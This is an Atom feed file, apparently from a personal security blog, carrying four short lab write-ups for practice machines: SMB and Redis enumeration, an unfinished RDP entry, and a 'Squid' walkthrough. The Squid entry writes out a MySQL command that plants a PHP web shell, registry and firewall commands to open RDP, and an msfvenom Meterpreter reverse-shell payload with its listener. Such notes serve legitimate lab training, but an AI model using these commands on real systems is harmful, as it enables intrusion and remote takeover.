@@ -1,0 +1,125 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Sphinx - HTB</title><link href="https://sfinx.kozow.com/" rel="alternate"></link><link href="https://sfinx.kozow.com/feeds/htb.atom.xml" rel="self"></link><id>https://sfinx.kozow.com/</id><updated>2024-05-19T19:10:00+01:00</updated><entry><title>Dancing Machine</title><link href="https://sfinx.kozow.com/2024/5/19/dancing/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/dancing/</id><summary type="html">&lt;h1&gt;Dancing Machine&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;In this machine we learn to enumerate SMB file shares.&lt;/p&gt;
+&lt;h3&gt;To list shares&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;-L&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;To download all file to a backup file become handing when u have a large file system&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;/&amp;lt;shareDisk&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N&lt;span class="w"&gt; &lt;/span&gt;-Tc&lt;span class="w"&gt; &lt;/span&gt;backup …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h1&gt;Dancing Machine&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;In this machine we learn to enumerate SMB file shares.&lt;/p&gt;
+&lt;h3&gt;To list shares&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;-L&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;To download all file to a backup file become handing when u have a large file system&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;smbclient&lt;span class="w"&gt; &lt;/span&gt;//&amp;lt;serverIP/name&amp;gt;/&amp;lt;shareDisk&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-N&lt;span class="w"&gt; &lt;/span&gt;-Tc&lt;span class="w"&gt; &lt;/span&gt;backup.tar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry><entry><title>Explosion Machine</title><link href="https://sfinx.kozow.com/2024/5/19/explosion/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/explosion/</id><content type="html">&lt;h1&gt;Explosion&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;This machine teach you how to interact with RDP protocol and enumerate it .&lt;/p&gt;
+&lt;p&gt;Let’s start by map to scan all open ports, since this machine is focused on RDP , we will reduce time by specifying the port on 3389 ;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry><entry><title>Redeemer Machine</title><link href="https://sfinx.kozow.com/2024/5/19/redeemer/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/redeemer/</id><summary type="html">&lt;h1&gt;Redeemer&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;This machine show you how to interact with a Redis server .&lt;/p&gt;
+&lt;p&gt;Doing Nmap scan show open port and specifically redid port open on :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;nmap&lt;span class="w"&gt; &lt;/span&gt;-sC&lt;span class="w"&gt; &lt;/span&gt;-sV&lt;span class="w"&gt; &lt;/span&gt;-T4&lt;span class="w"&gt; &lt;/span&gt;-p-&lt;span class="w"&gt; &lt;/span&gt;-oA&lt;span class="w"&gt; &lt;/span&gt;nmap/Redeemer&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;serverIp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Result :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;# &lt;/span&gt;Nmap&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.93&lt;span class="w"&gt; &lt;/span&gt;scan&lt;span class="w"&gt; &lt;/span&gt;initiated&lt;span class="w"&gt; &lt;/span&gt;Thu&lt;span class="w"&gt; &lt;/span&gt;Aug&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;02&lt;/span&gt;:07:23&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2023 …&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h1&gt;Redeemer&lt;/h1&gt;
+&lt;h1&gt;HTB/STARTING_POINT&lt;/h1&gt;
+&lt;p&gt;This machine show you how to interact with a Redis server .&lt;/p&gt;
+&lt;p&gt;Doing Nmap scan show open port and specifically redid port open on :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;nmap&lt;span class="w"&gt; &lt;/span&gt;-sC&lt;span class="w"&gt; &lt;/span&gt;-sV&lt;span class="w"&gt; &lt;/span&gt;-T4&lt;span class="w"&gt; &lt;/span&gt;-p-&lt;span class="w"&gt; &lt;/span&gt;-oA&lt;span class="w"&gt; &lt;/span&gt;nmap/Redeemer&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;serverIp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Result :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;# &lt;/span&gt;Nmap&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.93&lt;span class="w"&gt; &lt;/span&gt;scan&lt;span class="w"&gt; &lt;/span&gt;initiated&lt;span class="w"&gt; &lt;/span&gt;Thu&lt;span class="w"&gt; &lt;/span&gt;Aug&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;02&lt;/span&gt;:07:23&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2023&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;as:&lt;span class="w"&gt; &lt;/span&gt;nmap&lt;span class="w"&gt; &lt;/span&gt;-sC&lt;span class="w"&gt; &lt;/span&gt;-sV&lt;span class="w"&gt; &lt;/span&gt;-T4&lt;span class="w"&gt; &lt;/span&gt;-p-&lt;span class="w"&gt; &lt;/span&gt;-oA&lt;span class="w"&gt; &lt;/span&gt;nmap/Redeemer&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.129.6.102
+&lt;span class="go"&gt;Warning: 10.129.6.102 giving up on port because retransmission cap hit (6).&lt;/span&gt;
+&lt;span class="go"&gt;Nmap scan report for 10.129.6.102&lt;/span&gt;
+&lt;span class="go"&gt;Host is up (0.11s latency).&lt;/span&gt;
+&lt;span class="go"&gt;Not shown: 65526 closed tcp ports (conn-refused)&lt;/span&gt;
+&lt;span class="go"&gt;PORT      STATE    SERVICE VERSION&lt;/span&gt;
+&lt;span class="go"&gt;6379/tcp  open     redis   Redis key-value store 5.0.7&lt;/span&gt;
+&lt;span class="go"&gt;23201/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;23819/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;25153/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;34008/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;35903/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;39049/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;40140/tcp filtered unknown&lt;/span&gt;
+&lt;span class="go"&gt;47535/tcp filtered unknown&lt;/span&gt;
+
+&lt;span class="go"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="gp"&gt;# &lt;/span&gt;Nmap&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;at&lt;span class="w"&gt; &lt;/span&gt;Thu&lt;span class="w"&gt; &lt;/span&gt;Aug&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;02&lt;/span&gt;:25:02&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2023&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;--&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;IP&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;host&lt;span class="w"&gt; &lt;/span&gt;up&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;scanned&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1059&lt;/span&gt;.07&lt;span class="w"&gt; &lt;/span&gt;seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Connect to redis ;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$&lt;span class="w"&gt; &lt;/span&gt;redis-cli&lt;span class="w"&gt; &lt;/span&gt;-h&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;hostname/ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get all db ;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;config&lt;span class="w"&gt; &lt;/span&gt;get&lt;span class="w"&gt; &lt;/span&gt;databases
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get existed keys with correspond db index;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;info&lt;span class="w"&gt; &lt;/span&gt;keyspace&lt;span class="w"&gt; &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Select desired db;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;N&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get info on Redis server;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;info
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Dump all keys;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;keys&lt;span class="w"&gt; &lt;/span&gt;*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Get random keys;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;randomkey&lt;span class="w"&gt; &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Print specified key value;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis-cli&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;get&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;keyname&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry><entry><title>Squid Machine</title><link href="https://sfinx.kozow.com/2024/5/19/squid/" rel="alternate"></link><published>2024-05-19T19:10:00+01:00</published><updated>2024-05-19T19:10:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/squid/</id><summary type="html">&lt;h1&gt;SQUID - MACHINE / PG&lt;/h1&gt;
+&lt;h1&gt;PG/easy_windows&lt;/h1&gt;
+&lt;p&gt;This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128&lt;/p&gt;
+&lt;h4&gt;Mysql 3306:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;into&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;outfile&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;C:\\xampp\\htdocs\\backdoor.php&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Disable NLA;&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reg&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/v …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h1&gt;SQUID - MACHINE / PG&lt;/h1&gt;
+&lt;h1&gt;PG/easy_windows&lt;/h1&gt;
+&lt;p&gt;This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128&lt;/p&gt;
+&lt;h4&gt;Mysql 3306:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;into&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;outfile&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;C:\\xampp\\htdocs\\backdoor.php&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Disable NLA;&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reg&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/v&lt;span class="w"&gt; &lt;/span&gt;UserAuthentication&lt;span class="w"&gt; &lt;/span&gt;/t&lt;span class="w"&gt; &lt;/span&gt;REG_DWORD&lt;span class="w"&gt; &lt;/span&gt;/d&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Enable RDP on owned machine:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reg&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/v&lt;span class="w"&gt; &lt;/span&gt;fDenyTSConnections&lt;span class="w"&gt; &lt;/span&gt;/t&lt;span class="w"&gt; &lt;/span&gt;REG_DWORD&lt;span class="w"&gt; &lt;/span&gt;/d&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;netsh&lt;span class="w"&gt; &lt;/span&gt;advfirewall&lt;span class="w"&gt; &lt;/span&gt;firewall&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;rule&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;group&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;remote desktop&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;new&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;enable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Reverse Shell with Meterpreter:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;windows/meterpreter/reverse_tcp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.0.17&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;--format&lt;span class="o"&gt;=&lt;/span&gt;exe&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;evil.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;use&lt;span class="w"&gt; &lt;/span&gt;exploit/multi/handler
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;payload&lt;span class="w"&gt; &lt;/span&gt;windows/meterpreter/reverse_tcp
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;LHOST&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.0.17
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;LPORT&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;run
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry></feed>
